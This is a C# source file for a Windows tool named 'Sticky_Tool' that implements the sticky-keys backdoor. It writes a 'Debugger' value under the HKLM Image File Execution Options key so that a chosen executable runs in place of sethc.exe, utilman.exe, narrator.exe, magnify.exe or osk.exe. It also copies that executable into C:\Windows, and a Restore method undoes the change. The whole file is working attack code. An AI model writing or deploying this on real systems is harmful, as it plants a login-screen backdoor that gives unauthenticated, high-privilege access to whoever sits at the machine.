using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Sticky_Tool
{
    public class Methods 
    {

        public static string[] validTypes = new string[] {
            "sethc.exe (Sticky Keys)",
            "utilman.exe (Accessibility UI)",
            "narrator.exe (Narrator)",
            "magnify.exe (Magnifier)",
            "osk.exe (On-Screen Keyboard)"};

        private static string regPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\";
        private static DirectoryInfo saveDir = new DirectoryInfo(@"C:\Windows");

        public static void Stick(String oldEXE, String newEXE)
        {
            File.Copy(newEXE, $@"{saveDir.FullName}\Sticky-{oldEXE}", true);
            Microsoft.Win32.RegistryKey key;
            key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(regPath + oldEXE);
            key.SetValue("Debugger", newEXE);
            key.Close();
        }

        public static void Restore(String oldEXE)
        {

            foreach (var file in saveDir.EnumerateFiles("Sticky-*.exe"))
            {
                File.Delete(file.FullName);
            }
            Microsoft.Win32.RegistryKey key;
            key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(regPath + oldEXE);
            key.DeleteValue("Debugger");
            key.Close();
        }
    }
}
